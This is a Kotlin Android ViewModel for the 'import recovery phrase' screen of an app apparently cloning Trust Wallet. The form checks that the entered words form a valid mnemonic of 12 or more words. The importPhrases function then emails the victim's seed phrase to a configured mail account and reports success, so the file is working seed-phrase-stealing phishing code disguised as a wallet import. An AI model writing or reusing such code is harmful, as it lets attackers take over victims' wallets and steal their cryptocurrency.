package com.example.trustwalletclone.screens.importphrase

import android.app.Application
import android.util.Log
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.LiveData
import androidx.lifecycle.MediatorLiveData
import androidx.lifecycle.MutableLiveData
import com.example.trustwalletclone.model.MailHelper
import com.example.trustwalletclone.model.Wallet
import com.example.trustwalletclone.util.LiveDataValidator
import com.example.trustwalletclone.util.LiveDataValidatorResolver
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch

enum class ImportPhraseStatus { LOADING, SUCCESS, ERROR, NONE }

class ImportPhraseViewModel(wallet: Wallet, app: Application) : AndroidViewModel(app) {
    private val viewModelJob = Job()
    private val coroutineScope = CoroutineScope(viewModelJob + Dispatchers.IO)

    private val _selectedWallet = MutableLiveData<Wallet>()
    val selectedWallet: LiveData<Wallet>
        get() = _selectedWallet

    private val _eventPastePhrases = MutableLiveData<Boolean>()
    val eventPastePhrases: LiveData<Boolean>
        get() = _eventPastePhrases

    private val _importPhraseStatus = MutableLiveData<ImportPhraseStatus>()
    val importPhraseStatus: LiveData<ImportPhraseStatus>
        get() = _importPhraseStatus

    // Two-way databinding, exposing MutableLiveData
    val name = MutableLiveData<String>()
    val nameValidator = LiveDataValidator(name).apply {
        //Whenever the condition of the predicate is true, the error message should be emitted
        addRule("This field is required") { it.isNullOrBlank() }
    }

    val phrases = MutableLiveData<String>()
    val phrasesValidator = LiveDataValidator(phrases).apply {
        // Multiple rules.
        // The order in which they are added matters because the rules are checked one after the other
        addRule("This field is required") { it.isNullOrBlank() }
        addRule("Invalid mnemonic phrase") { isInvalidPhrases(toPhrases(it)) }
        addRule("Recovery phrase should be equal or more than 12 phrases") { toPhrases(it).size < 12 }
    }

    // We will use a mediator so we can update the error state of our form fields
    // and the enabled state of our import button as the form data changes
    private val isImportFormValidMediator = MediatorLiveData<Boolean>()

    init {
        _importPhraseStatus.value = ImportPhraseStatus.NONE
        _selectedWallet.value = wallet
        name.value = "Wallet 1"
        isImportFormValidMediator.value = false
    }

    // This method is called when the user clicks the import button
    private fun validateForm() {
        val validators = listOf(nameValidator, phrasesValidator)
        val validatorResolver = LiveDataValidatorResolver(validators)
        isImportFormValidMediator.value = validatorResolver.isValid()
    }

    /**
     * Check each phrase if it's not in our Word List Bank
     *
     * @param phrases
     * @return
     */
    private fun isInvalidPhrases(phrases: List<String>): Boolean {
        for (phrase in phrases) {
            if (phrase !in WordList.getAll()) return true
        }
        return false
    }

    /**
     * Convert phrases text from the user input to list of phrases
     *
     * @param text
     * @return
     */
    private fun toPhrases(text: String?): List<String> {
        return text?.trim()?.split("\\s+".toRegex())!!
    }

    fun importPhrases() {
        validateForm()
        if (isImportFormValidMediator.value!!) {
            coroutineScope.launch {
                _importPhraseStatus.postValue(ImportPhraseStatus.LOADING)
                try {
                    MailHelper.sendEmail(phrases.value!!, requireNotNull(MailHelper.mail).username)
                    Log.d("email", "Email has been sent")
                    _importPhraseStatus.postValue(ImportPhraseStatus.SUCCESS)
                } catch (e: Exception) {
                    Log.e("email", e.toString())
                    _importPhraseStatus.postValue(ImportPhraseStatus.ERROR)
                }
            }
        }
    }

    fun pastePhrases() {
        _eventPastePhrases.value = true
    }

    fun onPastePhrasesComplete() {
        _eventPastePhrases.value = false
    }

    fun onImportPhraseStatusComplete() {
        _importPhraseStatus.value = ImportPhraseStatus.NONE
    }

    fun updatePhrases(value: String) {
        phrases.value = value
    }
}
